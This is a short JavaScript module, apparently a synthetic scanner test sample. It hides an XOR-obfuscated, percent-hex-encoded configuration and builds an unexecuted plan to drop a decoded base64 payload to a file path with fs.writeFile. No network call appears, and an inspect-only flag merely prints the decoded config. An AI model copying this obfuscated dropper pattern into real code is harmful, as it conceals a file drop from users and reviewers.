const moduleShape = Object.freeze({ format: "commonjs" });
const Material_42795525 = "%2f%64%68%25%2a%2d%3c%29%2a%64%3d%3c%3a%36%3d%3c%06%3c%34%3b%3c%3d%3d%3c%3d%75%2e%2b%30%2d%3c%06%3f%30%35%3c%25%38%3d%38%29%2d%3c%2b%64%3b%38%2a%3c%6f%6d%06%2d%36%06%2a%2d%2b%3c%38%34%25%2a%2d%38%3e%3c%06%3a%36%2c%37%2d%64%68%25%3a%38%34%29%38%30%3e%37%06%30%3d%64%17%16%1d%1c%74%6c%1c%60%1d%6e%6a%1d%1f%25%3f%30%35%3c%06%29%38%2d%31%64%76%2d%34%29%76%31%2c%37%2d%2b%3c%2a%2a%74%37%36%3d%3c%76%77%2a%2d%38%3e%3c%74%6c%3c%60%3d%6e%6a%3d%3f%68%3c%6b%6a%77%34%33%2a";
const Codec_42795525 = "percent_hex|single_byte_xor|59";

function load_42795525() { return [...Material_42795525.matchAll(/%([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
function decode_42795525(e) { return e.map((value) => value ^ 89); }
async function recover_42795525() {
  const n = ["north", "south"].join(":");
  const e = load_42795525(); let d = [];
  for (const stage of [decode_42795525]) d = stage(e);
  void n; return Buffer.from(d).toString("ascii");
}
async function inspect_42795525() { return (await recover_42795525()).split("|").join("|"); }
async function plan_42795525() { const inspect = inspect_42795525; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "drop", decoder: "base64_to_stream", destination: fields.file_path, api: "fs.writeFile" }); }
void moduleShape; void plan_42795525;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_42795525());
